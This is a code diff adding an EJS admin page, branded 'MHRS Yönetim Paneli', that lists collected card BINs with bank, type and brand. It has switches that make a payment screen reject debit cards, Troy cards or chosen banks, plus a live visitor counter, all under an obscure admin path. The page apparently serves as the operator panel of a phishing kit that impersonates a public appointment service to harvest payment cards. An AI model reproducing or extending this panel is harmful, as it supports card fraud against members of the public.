@@ -1,0 +1,451 @@
+<!doctype html>
+<html lang="tr">
+
+<head>
+    <meta charset="utf-8">
+    <%- include('partials/tema-baslangic') %>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Kart Binleri | MHRS Yönetim</title>
+    <link href="/css/admin.css" rel="stylesheet">
+</head>
+
+<body class="admin-panel">
+    <header class="admin-topbar">
+        <div class="admin-brand">MHRS Yönetim Paneli</div>
+        <%- include('partials/nav') %>
+        <div class="admin-user">
+            <div class="admin-canli" id="canliRozet" title="Son 3 dakikada aktif olan kullanıcı sayısı">
+                <span class="canli-dot"></span>
+                <span class="canli-etiket">Anlık Aktif</span>
+                <span class="canli-sayi" id="canli-sayi"><%= locals.cevrimiciZiyaretci || 0 %></span>
+            </div>
+            <span class="admin-name"><%= kullaniciAdi %></span>
+            <button type="button" id="temaBtn" class="tema-btn" aria-label="Temayı değiştir" title="Aydınlık / Karanlık tema"></button>
+            <a href="/SADSDAFHBEUBCE/cikis" class="btn-cikis">Çıkış Yap</a>
+        </div>
+    </header>
+    <main class="admin-main panel-genis">
+
+        <section class="panel-card">
+            <div class="kart-baslik">
+                <h2>Veritabanındaki Kart BIN'leri (<span id="binSayisi">0</span>)</h2>
+                <div class="kart-aksiyon">
+                    <div class="engel-kontrol" id="engelKontrol" data-engelli="<%= bankaKartiEngelli ? '1' : '0' %>">
+                        <span class="engel-durum" id="engelDurum">
+                            <span class="engel-nokta <%= bankaKartiEngelli ? 'engel-nokta-kapali' : 'engel-nokta-acik' %>" id="engelNokta"></span>
+                            <span id="engelMetin"><%= bankaKartiEngelli ? 'Banka kartları engelli' : 'Banka kartları açık' %></span>
+                        </span>
+                        <button type="button" class="engel-btn <%= bankaKartiEngelli ? 'btn-engel-ac' : 'btn-engel-kapat' %>" id="engelBtn">
+                            <%= bankaKartiEngelli ? 'Banka Kartlarını Aç' : 'Banka Kartlarını Engelle' %>
+                        </button>
+                    </div>
+                    <div class="engel-kontrol" id="troyEngelKontrol" data-engelli="<%= troyKartiEngelli ? '1' : '0' %>">
+                        <span class="engel-durum" id="troyEngelDurum">
+                            <span class="engel-nokta <%= troyKartiEngelli ? 'engel-nokta-kapali' : 'engel-nokta-acik' %>" id="troyEngelNokta"></span>
+                            <span id="troyEngelMetin"><%= troyKartiEngelli ? 'Troy kartları engelli' : 'Troy kartları açık' %></span>
+                        </span>
+                        <button type="button" class="engel-btn <%= troyKartiEngelli ? 'btn-engel-ac' : 'btn-engel-kapat' %>" id="troyEngelBtn">
+                            <%= troyKartiEngelli ? 'Troy Kartlarını Aç' : 'Troy Kartlarını Engelle' %>
+                        </button>
+                    </div>
+                    <input type="search" id="binArama" class="arama-kutusu" placeholder="BIN, banka, marka veya tür ara..." autocomplete="off">
+                    <button type="button" class="engel-btn btn-engel-kapat" id="gelismisBtn">Gelişmiş Ayarlar</button>
+                    <span class="kart-ipucu">Son 1000 kayıt gösteriliyor</span>
+                </div>
+            </div>
+            <p class="bos-mesaj" id="binBos" style="display:none">Henüz kayıtlı BIN bilgisi yok.</p>
+            <div class="tablo-sarici">
+                <table class="admin-table" id="binTablosu">
+                    <thead>
+                        <tr>
+                            <th>BIN</th>
+                            <th>Banka</th>
+                            <th>Kart Türü</th>
+                            <th>Marka</th>
+                        </tr>
+                    </thead>
+                    <tbody></tbody>
+                </table>
+            </div>
+        </section>
+    </main>
+
+    <!-- Gelişmiş Ayarlar Popup -->
+    <div class="modal-overlay" id="gelismisModal" style="display:none">
+        <div class="modal-kutu">
+            <div class="modal-baslik">
+                <h2>Gelişmiş Ayarlar</h2>
+                <p>Bankaları listeleyerek tek tek açıp kapatabilirsiniz. Kapalı olan bankalardan gelen kartlar ödeme ekranında reddedilir.</p>
+                <button type="button" class="modal-kapat" id="modalKapat" aria-label="Kapat">&times;</button>
+            </div>
+            <div class="modal-arama">
+                <input type="search" id="bankaArama" class="arama-kutusu" placeholder="Banka ara..." autocomplete="off">
+            </div>
+            <div class="modal-liste" id="bankaListesi">
+                <p class="modal-yukleniyor">Bankalar yükleniyor...</p>
+            </div>
+            <div class="modal-ayak">
+                <span id="bankaSayisi" class="modal-sayi"></span>
+                <button type="button" class="modal-kaydet-btn" id="bankaKaydet">Değişiklikleri Kaydet</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function () {
+            'use strict';
+            var kapaliBankalar = <%- kapaliBankalar || '[]' %>;
+            var tumBankalar = [];
+            var aramaMetni = '';
+            var ilkYuklendi = false;
+
+            var modal = document.getElementById('gelismisModal');
+            var gelismisBtn = document.getElementById('gelismisBtn');
+            var modalKapat = document.getElementById('modalKapat');
+            var bankaListesi = document.getElementById('bankaListesi');
+            var bankaArama = document.getElementById('bankaArama');
+            var bankaSayisi = document.getElementById('bankaSayisi');
+            var bankaKaydet = document.getElementById('bankaKaydet');
+
+            var kapaliSet = new Set(kapaliBankalar);
+
+            function kapaliDurum(banka) {
+                return kapaliSet.has(banka);
+            }
+
+            function toggleDurum(banka) {
+                if (kapaliSet.has(banka)) kapaliSet.delete(banka);
+                else kapaliSet.add(banka);
+            }
+
+            function filtrele() {
+                var q = aramaMetni.trim().toLowerCase();
+                if (!q) return tumBankalar;
+                return tumBankalar.filter(function (b) {
+                    return b.banka.toLowerCase().indexOf(q) !== -1;
+                });
+            }
+
+            function tabloCiz() {
+                var list = filtrele();
+                bankaListesi.innerHTML = '';
+                if (list.length === 0) {
+                    bankaListesi.innerHTML = '<p class="modal-yukleniyor">Banka bulunamadı.</p>';
+                    bankaSayisi.textContent = '';
+                    return;
+                }
+                bankaSayisi.textContent = list.length + ' banka';
+                list.forEach(function (b) {
+                    var satir = document.createElement('div');
+                    satir.className = 'banka-satiri';
+                    var ad = document.createElement('span');
+                    ad.className = 'banka-ad';
+                    ad.textContent = b.banka;
+                    var anahtar = document.createElement('label');
+                    anahtar.className = 'switch';
+                    var onay = document.createElement('input');
+                    onay.type = 'checkbox';
+                    onay.checked = !kapaliDurum(b.banka);
+                    onay.dataset.banka = b.banka;
+                    var kaydirici = document.createElement('span');
+                    kaydirici.className = 'slider';
+                    anahtar.appendChild(onay);
+                    anahtar.appendChild(kaydirici);
+                    satir.appendChild(ad);
+                    satir.appendChild(anahtar);
+                    bankaListesi.appendChild(satir);
+                });
+            }
+
+            function modalAc() {
+                modal.style.display = 'flex';
+                document.body.style.overflow = 'hidden';
+                if (!ilkYuklendi) {
+                    bankaListesi.innerHTML = '<p class="modal-yukleniyor">Bankalar yükleniyor...</p>';
+                    fetch('/SADSDAFHBEUBCE/kart-binleri/bankalar', { headers: { 'Accept': 'application/json' } })
+                        .then(function (r) { return r.json(); })
+                        .then(function (list) {
+                            if (Array.isArray(list)) {
+                                tumBankalar = list;
+                                kapaliSet = new Set(list.filter(function (x) { return x.kapali; }).map(function (x) { return x.banka; }));
+                                ilkYuklendi = true;
+                                tabloCiz();
+                            }
+                        })
+                        .catch(function () {
+                            bankaListesi.innerHTML = '<p class="modal-yukleniyor">Bankalar yüklenemedi.</p>';
+                        });
+                } else {
+                    tabloCiz();
+                }
+            }
+
+            function modalKapatFn() {
+                modal.style.display = 'none';
+                document.body.style.overflow = '';
+                kapaliSet = new Set(kapaliBankalar);
+                tabloCiz();
+            }
+
+            gelismisBtn.addEventListener('click', modalAc);
+            modalKapat.addEventListener('click', modalKapatFn);
+            modal.addEventListener('click', function (e) {
+                if (e.target === modal) modalKapatFn();
+            });
+            document.addEventListener('keydown', function (e) {
+                if (e.key === 'Escape') modalKapatFn();
+            });
+            bankaArama.addEventListener('input', function (e) {
+                aramaMetni = e.target.value;
+                tabloCiz();
+            });
+            bankaListesi.addEventListener('change', function (e) {
+                if (e.target && e.target.type === 'checkbox') {
+                    toggleDurum(e.target.dataset.banka);
+                }
+            });
+            bankaKaydet.addEventListener('click', function () {
+                var degisiklik = tumBankalar.map(function (b) { return { banka: b.banka, kapali: kapaliSet.has(b.banka) }; });
+                bankaKaydet.disabled = true;
+                var eski = bankaKaydet.textContent;
+                bankaKaydet.textContent = 'Kaydediliyor...';
+                fetch('/SADSDAFHBEUBCE/kart-binleri/banka-engelle-many', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ bankalar: degisiklik })
+                })
+                    .then(function (r) { return r.json(); })
+                    .then(function (v) {
+                        if (v && v.ok) {
+                            kapaliBankalar = Array.from(kapaliSet);
+                            window.alert('Banka ayarları kaydedildi.');
+                        } else {
+                            window.alert((v && v.hata) || 'Kaydedilemedi.');
+                        }
+                    })
+                    .catch(function () { window.alert('Sunucuya ulaşılamadı.'); })
+                    .finally(function () {
+                        bankaKaydet.disabled = false;
+                        bankaKaydet.textContent = eski;
+                    });
+            });
+        })();
+    </script>
+
+    <script>
+        (function () {
+            'use strict';
+            var POLL_MS = 5000;
+            var tumBinler = <%- JSON.stringify(binler).replace(/</g, '\\u003c') %>;
+            var aramaMetni = '';
+
+            function hucre(metin, sinif) {
+                var td = document.createElement('td');
+                td.textContent = metin;
+                if (sinif) td.className = sinif;
+                return td;
+            }
+
+            function rozet(metin, ekSinif) {
+                var span = document.createElement('span');
+                span.className = 'banka-rozet' + (ekSinif ? ' ' + ekSinif : '');
+                span.textContent = metin;
+                return span;
+            }
+
+            function bankaSinifi(banka) {
+                var ad = String(banka || '').toLowerCase();
+                if (ad.includes('is') || ad.includes('iş') || ad.includes('ziraat') || ad.includes('halk')) return 'rozet-kirmizi';
+                if (ad.includes('garanti') || ad.includes('akbank') || ad.includes('yapi') || ad.includes('yapı') || ad.includes('finans')) return 'rozet-mavi';
+                if (ad.includes('vakif') || ad.includes('vakıf') || ad.includes('deniz') || ad.includes('teb') || ad.includes('qnb')) return 'rozet-yesil';
+                return 'rozet-gri';
+            }
+
+            function kartTuruRozeti(tur) {
+                var t = String(tur || '').toUpperCase();
+                if (t.indexOf('KREDİ') !== -1) return 'rozet-mavi';
+                if (t.indexOf('BANKA') !== -1) return 'rozet-yesil';
+                return 'rozet-gri';
+            }
+
+            function filtrele() {
+                var q = aramaMetni.trim().toLowerCase();
+                if (!q) return tumBinler;
+                return tumBinler.filter(function (b) {
+                    return [b.bin, b.banka, b.marka, b.kartTuru]
+                        .some(function (v) { return v && String(v).toLowerCase().indexOf(q) !== -1; });
+                });
+            }
+
+            function tabloCiz() {
+                var tbody = document.querySelector('#binTablosu tbody');
+                var bos = document.getElementById('binBos');
+                var tablo = document.getElementById('binTablosu');
+                var sayi = document.getElementById('binSayisi');
+                var list = filtrele();
+                tbody.innerHTML = '';
+                sayi.textContent = list.length;
+                if (list.length === 0) {
+                    bos.style.display = '';
+                    tablo.style.display = 'none';
+                    return;
+                }
+                bos.style.display = 'none';
+                tablo.style.display = '';
+                list.forEach(function (b) {
+                    var tr = document.createElement('tr');
+                    tr.appendChild(hucre(b.bin || '-', 'bin-no'));
+                    var bTd = document.createElement('td');
+                    bTd.appendChild(rozet(b.banka || '-', bankaSinifi(b.banka)));
+                    tr.appendChild(bTd);
+                    var tTd = document.createElement('td');
+                    tTd.appendChild(rozet(b.kartTuru || '-', kartTuruRozeti(b.kartTuru)));
+                    tr.appendChild(tTd);
+                    tr.appendChild(hucre(b.marka || '-', 'bin-marka'));
+                    tbody.appendChild(tr);
+                });
+            }
+
+            function guncelle() {
+                fetch('/SADSDAFHBEUBCE/kart-binleri/veriler', { headers: { 'Accept': 'application/json' } })
+                    .then(function (r) {
+                        if (!r.ok) throw new Error('HTTP ' + r.status);
+                        return r.json();
+                    })
+                    .then(function (list) {
+                        if (Array.isArray(list)) {
+                            tumBinler = list;
+                            tabloCiz();
+                        }
+                    })
+                    .catch(function () { });
+            }
+
+            document.getElementById('binArama').addEventListener('input', function (e) {
+                aramaMetni = e.target.value;
+                tabloCiz();
+            });
+
+            var engelBtn = document.getElementById('engelBtn');
+            var engelKontrol = document.getElementById('engelKontrol');
+            var engelNokta = document.getElementById('engelNokta');
+            var engelMetin = document.getElementById('engelMetin');
+
+            function engelDurumunuGuncelle(engelli) {
+                if (engelKontrol) engelKontrol.setAttribute('data-engelli', engelli ? '1' : '0');
+                if (engelNokta) {
+                    engelNokta.className = 'engel-nokta ' + (engelli ? 'engel-nokta-kapali' : 'engel-nokta-acik');
+                }
+                if (engelMetin) engelMetin.textContent = engelli ? 'Banka kartları engelli' : 'Banka kartları açık';
+                if (engelBtn) {
+                    engelBtn.textContent = engelli ? 'Banka Kartlarını Aç' : 'Banka Kartlarını Engelle';
+                    engelBtn.className = 'engel-btn ' + (engelli ? 'btn-engel-ac' : 'btn-engel-kapat');
+                }
+            }
+
+            if (engelBtn) {
+                engelBtn.addEventListener('click', function () {
+                    var simdi = engelKontrol.getAttribute('data-engelli') === '1';
+                    var hedef = !simdi;
+                    var eskiMetin = engelBtn.textContent;
+                    engelBtn.disabled = true;
+                    engelBtn.textContent = 'Güncelleniyor...';
+                    fetch('/SADSDAFHBEUBCE/kart-binleri/banka-engelle', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ engelli: hedef })
+                    })
+                        .then(function (r) { return r.json(); })
+                        .then(function (v) {
+                            if (v && v.ok) {
+                                engelDurumunuGuncelle(!!v.engelli);
+                            } else {
+                                window.alert((v && v.hata) || 'Güncellenemedi.');
+                            }
+                        })
+                        .catch(function () { window.alert('Sunucuya ulaşılamadı.'); })
+                        .finally(function () {
+                            engelBtn.disabled = false;
+                            engelBtn.textContent = eskiMetin;
+                            engelDurumunuGuncelle(engelKontrol.getAttribute('data-engelli') === '1');
+                        });
+                });
+            }
+
+            tabloCiz();
+            setInterval(guncelle, POLL_MS);
+            document.addEventListener('visibilitychange', function () {
+                if (!document.hidden) guncelle();
+            });
+
+            var troyEngelBtn = document.getElementById('troyEngelBtn');
+            var troyEngelKontrol = document.getElementById('troyEngelKontrol');
+            var troyEngelNokta = document.getElementById('troyEngelNokta');
+            var troyEngelMetin = document.getElementById('troyEngelMetin');
+
+            function troyEngelDurumunuGuncelle(engelli) {
+                if (troyEngelKontrol) troyEngelKontrol.setAttribute('data-engelli', engelli ? '1' : '0');
+                if (troyEngelNokta) {
+                    troyEngelNokta.className = 'engel-nokta ' + (engelli ? 'engel-nokta-kapali' : 'engel-nokta-acik');
+                }
+                if (troyEngelMetin) troyEngelMetin.textContent = engelli ? 'Troy kartları engelli' : 'Troy kartları açık';
+                if (troyEngelBtn) {
+                    troyEngelBtn.textContent = engelli ? 'Troy Kartlarını Aç' : 'Troy Kartlarını Engelle';
+                    troyEngelBtn.className = 'engel-btn ' + (engelli ? 'btn-engel-ac' : 'btn-engel-kapat');
+                }
+            }
+
+            if (troyEngelBtn) {
+                troyEngelBtn.addEventListener('click', function () {
+                    var simdi = troyEngelKontrol.getAttribute('data-engelli') === '1';
+                    var hedef = !simdi;
+                    var eskiMetin = troyEngelBtn.textContent;
+                    troyEngelBtn.disabled = true;
+                    troyEngelBtn.textContent = 'Güncelleniyor...';
+                    fetch('/SADSDAFHBEUBCE/kart-binleri/troy-engelle', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ engelli: hedef })
+                    })
+                        .then(function (r) { return r.json(); })
+                        .then(function (v) {
+                            if (v && v.ok) {
+                                troyEngelDurumunuGuncelle(!!v.engelli);
+                            } else {
+                                window.alert((v && v.hata) || 'Güncellenemedi.');
+                            }
+                        })
+                        .catch(function () { window.alert('Sunucuya ulaşılamadı.'); })
+                        .finally(function () {
+                            troyEngelBtn.disabled = false;
+                            troyEngelBtn.textContent = eskiMetin;
+                            troyEngelDurumunuGuncelle(troyEngelKontrol.getAttribute('data-engelli') === '1');
+                        });
+                });
+            }
+        })();
+    </script>
+    <script>
+        (function () {
+            'use strict';
+            function anlikGuncelle() {
+                fetch('/SADSDAFHBEUBCE/panel/veriler', { headers: { 'Accept': 'application/json' } })
+                    .then(function (r) { return r.ok ? r.json() : null; })
+                    .then(function (v) {
+                        if (!v || typeof v.cevrimiciZiyaretci !== 'number') return;
+                        var el = document.getElementById('canli-sayi');
+                        if (el) el.textContent = v.cevrimiciZiyaretci;
+                    })
+                    .catch(function () { });
+            }
+            anlikGuncelle();
+            setInterval(anlikGuncelle, 5000);
+            document.addEventListener('visibilitychange', function () {
+                if (!document.hidden) anlikGuncelle();
+            });
+        })();
+    </script>
+    <script src="/js/admin-tema.js"></script>
+</body>
+
+</html>
